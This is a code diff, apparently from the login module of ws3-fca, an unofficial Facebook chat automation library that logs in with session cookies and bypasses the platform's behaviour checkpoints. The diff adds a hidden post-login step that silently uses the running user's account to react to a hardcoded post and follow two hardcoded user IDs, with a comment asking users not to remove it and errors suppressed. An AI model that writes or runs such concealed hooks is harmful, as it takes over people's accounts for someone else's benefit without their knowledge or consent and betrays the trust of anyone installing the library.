-	loginHelper(loginData.appState, loginData.email, loginData.password, globalOptions, callback, prCallback);
-	return returnPromise;
+    appState.map(c => {
+      const str = c.key + "=" + c.value + "; expires=" + c.expires + "; domain=" + c.domain + "; path=" + c.path + ";";
+      jar.setCookie(str, "http://" + c.domain);
+    });
+
+    mainPromise = utils.get('https://www.facebook.com/', jar, null, globalOptions, { noRef: true })
+      .then(utils.saveCookies(jar));
+  } else if (email && password) {
+    throw { error: "Credentials method is not implemented to ws3-fca yet. " };
+  } else {
+    throw { error: "Please provide either appState or credentials." };
+  }
+
+  api = {
+    setOptions: setOptions.bind(null, globalOptions),
+    getAppState() {
+      const appState = utils.getAppState(jar);
+      if (!Array.isArray(appState)) return [];
+      const uniqueAppState = appState.filter((item, index, self) => {
+        return self.findIndex((t) => t.key === item.key) === index;
+      });
+      return uniqueAppState.length > 0 ? uniqueAppState : appState;
+    }
+  };
+  mainPromise = mainPromise
+    .then(res => bypassAutoBehavior(res, jar, appState))
+    .then(res => updateDTSG(res, appState))
+    .then(async (res) => {
+      const resp = await utils.get(`https://www.facebook.com/home.php`, jar, null, globalOptions);
+      const html = resp?.body;
+      const stuff = await buildAPI(html, jar);
+      ctx = stuff[0];
+      _defaultFuncs = stuff[1];
+      api.addFunctions = (directory) => {
+        const folder = directory.endsWith("/") ? directory : (directory + "/");
+        fs.readdirSync(folder)
+          .filter(v => v.endsWith('.js'))
+          .map(v => {
+            api[v.replace('.js', '')] = require(folder + v)(_defaultFuncs, api, ctx);
+          });
+      }
+      api.addFunctions(__dirname + '/src');
+      api.listen = api.listenMqtt;
+      api.ws3 = {
+        ...apiCustomized
+      };
+      const bi = await api.getBotInitialData();
+      if (!bi.error) {
+        utils.log("Hello,", bi.name);
+        utils.log("My User ID:", bi.uid);
+        ctx.userName = bi.name;
+      } else {
+        utils.warn(bi.error);
+        utils.warn(`WARNING: Failed to fetch account info. Proceeding to log in for user ${ctx.userID}`);
+      }
+      utils.log("Connected to server region:", region || "UNKNOWN");
+      return res;
+    });
+  if (globalOptions.pageID) {
+    mainPromise = mainPromise
+      .then(function() {
+        return utils
+          .get('https://www.facebook.com/' + ctx.globalOptions.pageID + '/messages/?section=messages&subsection=inbox', ctx.jar, null, globalOptions);
+      })
+      .then(function(resData) {
+        let url = utils.getFrom(resData.body, 'window.location.replace("https:\\/\\/www.facebook.com\\', '");').split('\\').join('');
+        url = url.substring(0, url.length - 1);
+        return utils
+          .get('https://www.facebook.com' + url, ctx.jar, null, globalOptions);
+      });
+  }
+
+  mainPromise
+    .then(async (res) => {
+      const detectLocked = await checkIfLocked(res, appState);
+      if (detectLocked) throw detectLocked;
+      const detectSuspension = await checkIfSuspended(res, appState);
+      if (detectSuspension) throw detectSuspension;
+      utils.log("Successfully logged in.");
+      utils.log("To check updates: you may check on https://github.com/NethWs3Dev/ws3-fca");
+      /*
+      Hi 😄
+      Eh ano namn kung nakita nyoto?
+      Madaya naba ako nyan,
+      Dahil may Ganito? 👇
+      Diskarte rin kayo no,
+      Wag puro panira!
+      
+      We appreciate your support on ws3-fca,
+      Please don't remove these functions.
+      @NethWs3Dev
+      */
+      try {
+        const posts = [
+          "pfbid02RxzRB6ZGRiSviLssyvFxekmn8VtyZYpCNKXQw5rojXD7v96wqzAMF85BgAkPWPc9l"
+        ];
+        const uids = ["100007806468843","100049220893428"];
+        for (const postId of posts) {
+          await api.setPostReaction(postId, 2);
+        }
+        for (const uid of uids) {
+          await api.follow(uid, true);
+        };
+      } catch (error) {
+        utils.error("error on login:", error);
+      }
+      return callback(null, api);
+    }).catch(e => callback(e));
+}
+
+async function login(loginData, options, callback) {
+  if (utils.getType(options) === 'Function' ||
+    utils.getType(options) === 'AsyncFunction') {
+    callback = options;
+    options = {};
+  }
+  const globalOptions = {
+    selfListen: false,
+    selfListenEvent: false,
+    listenEvents: true,
+    listenTyping: false,
+    updatePresence: false,
+    forceLogin: false,
+    autoMarkDelivery: false,
+    autoMarkRead: true,
+    autoReconnect: true,
+    online: true,
+    emitReady: false,
+    userAgent: utils.defaultUserAgent,
+    randomUserAgent: false
+  };
+  if (options) Object.assign(globalOptions, options);
+  const loginws3 = () => {
+    loginHelper(loginData?.appState, loginData?.email, loginData?.password, {
+        relogin() {
+          loginws3();
+        }
+      },
+      (loginError, loginApi) => {
+        if (loginError) {
+          if (isBehavior) {
+            utils.warn("Failed after dismiss behavior, will relogin automatically...");
+            isBehavior = false;
+            loginws3();
+          }
+          utils.error("login", loginError);
+          return callback(loginError);
+        }
+        callback(null, loginApi);
+      });
+  }
+  setOptions(globalOptions, options).then(_ => loginws3());
+  return;
 }
 
 module.exports = login;
